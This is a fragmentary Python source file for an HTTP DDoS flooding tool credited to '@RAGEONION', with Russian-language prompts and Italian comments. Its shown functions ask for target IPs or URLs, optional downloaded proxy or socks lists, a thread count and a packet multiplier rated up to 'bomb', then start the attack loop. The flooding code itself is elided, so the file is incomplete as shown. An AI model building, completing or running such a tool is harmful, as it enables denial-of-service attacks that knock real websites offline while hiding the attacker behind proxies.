...
DDOS HTTP by @RAGEONION

developer TG : @RAGERUSSIA

Version 1.0	''') # la grafica ci sta
...
def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	...
	choice1 = input("\nОдна атака - 0,две и более атаки - 1 > ")

	if choice1 == "1":
		ip_file = input("Введите название файла с вашими целями ip/url > ")
		...
		try:
			...
			print("Вы опечатались, попробуйте еще раз..")
			starturl()
...
def proxymode():
	global choice2
	choice2 = input("Вы собираетесь использовать proxy/socks? Да - y Нет - Enter: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choicedownproxy():
	choice4 = input("Для скачивания proxy нажмите - y,если у вас есть свои нажмите Enter: ")
	if choice4 == "y":
...
def choicedownsocks():
	choice4 = input("Для скачивания socks нажмите - y,если у вас есть файл,то нажмите Enter: ")
	if choice4 == "y":
...
def proxylist():
	global proxies
	out_file = str(input("Введите название файла : (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("Введите threads (800): "))
	except ValueError:
		threads = 800
...
def multiplication():
	global multiple
	try:
		multiple = int(input("Введите количество packets [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
	except ValueError:
		print("Похоже вы совершили ошибку.\n")
		multiplication()
	begin()

def begin():
	choice6 = input("Нажмите 'Enter' для атаки: ")
	if choice6 == "":
		loop()
